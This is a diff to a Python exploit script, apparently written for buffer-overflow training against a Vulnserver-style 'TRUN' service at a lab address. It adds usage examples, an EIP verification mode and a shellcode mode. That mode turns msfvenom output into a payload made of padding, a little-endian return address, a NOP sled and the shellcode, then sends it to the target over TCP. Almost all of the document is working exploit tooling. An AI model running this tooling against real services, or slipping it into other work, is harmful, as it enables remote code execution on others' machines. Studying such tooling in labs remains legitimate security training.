@@ -8,16 +8,25 @@ Usage:
     python .\main.py --target 192.168.217.133 --port 9999 --command "TRUN /.:/"  --mode fuzz
 
 - Offset + EIP:
-    python .\main.py --target 192.168.217.133 --port 9999 --prefix "TRUN /.:/"  --mode offset --olength 2400
+    python .\main.py --target 192.168.217.133 --port 9999 --prefix "TRUN /.:/"  --mode offset --length 2400
 
 - Bad Character Tests:
-    python .\main.py --target 192.168.217.133 --port 9999 --prefix "TRUN /.:/"  --mode badchar --blength 2003
+    python .\main.py --target 192.168.217.133 --port 9999 --prefix "TRUN /.:/"  --mode badchar --length 2003
+
+- Verify EIP offset:
+    python .\main.py --target 192.168.217.133 --port 9999 --prefix "TRUN /.:/"  --mode verify --length 2003
+
+- Shellcode:
+    python .\main.py --target 192.168.217.133 --port 9999 --prefix "TRUN /.:/"  --mode shellcode --length 2003 \
+        --shell_file shell.txt --eip 625011af
+
 '''
 
 import argparse
 import socket
 from time import sleep
 from math import ceil
+from enum import Enum
 
 
 # Find out the amount of bytes it takes for the target program to crash
@@ -38,21 +47,6 @@ def fuzz(target: str, port: int, expect_resp: bool, stride: int, command_prefix:
             except Exception as e:
                 print(e)
                 return len(payload)
-
-
-# Send a chunk of unique pattern'd data to target server
-def send_chunk(target: str, port: int, command_prefix: str, sequence: str, send_raw: bool = False):
-    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
-        sock.connect((target, port))
-        print("send %s bytes" % len(sequence))
-        # Bad Character needs to be sent raw, otherwise there will be C0 characters
-        # However, other payloads need to be encoded to utf-8 otherwise EIP value will be wrong
-        # This might have something to do with Little Endian
-        if send_raw:
-            sock.send(bytes(command_prefix + sequence, "raw_unicode_escape"))
-        else:
-            sock.send((command_prefix + sequence).encode("utf-8"))
-        print("sent")
 
 
 def find_offset(sequence: str) -> int:
@@ -85,12 +79,43 @@ def generate_unique_pattern(length) -> str:
     return res
 
 
+class Chunk_type(Enum):
+    UTF = 1
+    RAW_STR = 2
+    BYTEARRAY = 3
+
+
+# Send a chunk of unique pattern'd data to target server
+def send_chunk(target: str, port: int, command_prefix: str, sequence, type: Chunk_type = Chunk_type.UTF):
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+        sock.connect((target, port))
+        print("send %s bytes" % len(sequence))
+        # Bad Character needs to be sent raw, otherwise there will be C0 characters
+        # However, other payloads need to be encoded to utf-8 otherwise EIP value will be wrong
+        # This might have something to do with Little Endian
+        if type == Chunk_type.RAW_STR:
+            payload = bytes(command_prefix + sequence, "raw_unicode_escape")
+            print("raw_str")
+            sock.send(payload)
+        elif type == Chunk_type.UTF:
+            print("utf-8")
+            sock.send((command_prefix + sequence).encode("utf-8"))
+        elif type == Chunk_type.BYTEARRAY:
+            print("byte array")
+            payload = bytearray(command_prefix, "utf-8")
+            payload.extend(sequence)
+            print(payload)
+            sock.send((payload))
+        print("sent")
+
+
 # Arguments
 parser = argparse.ArgumentParser(description="Dumb fuzzing tool")
 
 # -- Mode --
 parser.add_argument("--mode", type=str,
-                    help="[required] attack mode: fuzz|offset|badchar")
+                    help="[required] attack mode: fuzz|offset|badchar|verify_offset|shellcode")
+
 # -- Target --
 parser.add_argument("--target", type=str, help="[required] target server")
 parser.add_argument("--port", type=int, help="[required] target port")
@@ -101,19 +126,28 @@ parser.add_argument("--timeout", type=bool,
                     help="[optional] timeout in seconds if program didn't respond. default 5", default=5)
 parser.add_argument("--prefix", type=str,
                     help="[optional] command prefix. default empty", default="")
+
 # -- Fuzz --
 parser.add_argument("--stride", type=int,
                     help="[optional] number in bytes to increment for each fuzzing iteration. default 100", default=100)
-# -- Offset --
-parser.add_argument("--olength", type=int,
-                    help="[optional] unique pattern of strings at given length to be sent. default 2000", default=2000)
 
-# -- Bad Character --
+# -- Offset -- | -- Bad Character -- | -- Shellcode --
 # FIXME: Make arguments required conditionally
-parser.add_argument("--blength", type=int,
-                    help="[optinoal] offset right before EIP location, used for testing bad characters", default=0)
+parser.add_argument("--length", type=int,
+                    help="[offset mode] unique pattern of strings at given length to be sent. default 2000\n\
+    [badchar mode] offset right before EIP location, used for testing bad characters", default=2000)
 
 # -- Shellcode --
+shellcode_example = '''
+unsigned char buf[] = 
+"\x52\x31"
+"\xff\xc6"
+"\x80\xbe";'''
+parser.add_argument("--shell_file", type=str,
+                    help="shellcode file that's generated by msfvenom. e.g. " + shellcode_example, default="")
+parser.add_argument("--eip", type=str,
+                    help="EIP value to jump to unprotected module's address, \
+                        this will be converted to Little Endian internally. e.g. 625011af", default="")
 
 
 # Main Program
@@ -127,7 +161,7 @@ if mode == "fuzz":
     print("Program crashed at %s bytes", len_crash_bytes)
 
 elif mode == "offset":
-    seq = generate_unique_pattern(args.olength)
+    seq = generate_unique_pattern(args.length)
     send_chunk(args.target, args.port, args.prefix, seq)
     offset = find_offset(seq)
     print("offset is at", offset)
@@ -136,9 +170,38 @@ elif mode == "badchar":
     # Generate 0x01 to 0xff into a string
     badchars = "".join([chr(h) for h in range(1, 256)])
     # As the stack size might be limited, we place this full set of bad characters inside heap
-    payload = args.blength * "A" + "B" * 4 + badchars
-    print("sending bad character test payload:", payload)
-    send_chunk(args.target, args.port, args.prefix, payload, True)
+    payload = args.length * "A" + "B" * 4 + badchars
+    # print("sending bad character test payload:", payload)
+    send_chunk(args.target, args.port, args.prefix,
+               payload, Chunk_type.RAW_STR)
+
+elif mode == "verify":
+    payload = args.length * "A" + "DEFG"
+    send_chunk(args.target, args.port, args.prefix,
+               payload, Chunk_type.RAW_STR)
+
+
+elif mode == "shellcode":
+    with open(args.shell_file) as f:
+        content = f.read()
+    # Clean up & Convert msfvenom shellcode into bytearrays
+    shellcode_str = "".join([line for line in content.replace(
+        "unsigned char buf[] = ", "").replace(";", "").replace('"', "").split("\n")])
+    shellcodes_hex = list(filter(lambda c: len(c) > 0, [
+        c for c in shellcode_str.split("\\x")]))
+
+    # Convert EIP input to Little Endian
+    eip_le = bytearray.fromhex(args.eip)[::-1]
+
+    payload = bytearray(args.length * "A", "raw_unicode_escape")
+    payload.extend(eip_le)
+    payload.extend(bytearray("\x90" * 50, "raw_unicode_escape"))
+
+    for h in shellcodes_hex:
+        payload.extend(bytearray.fromhex(h))
+
+    send_chunk(args.target, args.port, args.prefix,
+               payload, Chunk_type.BYTEARRAY)
 
 else:
     print("[ERROR] attack mode invalid")
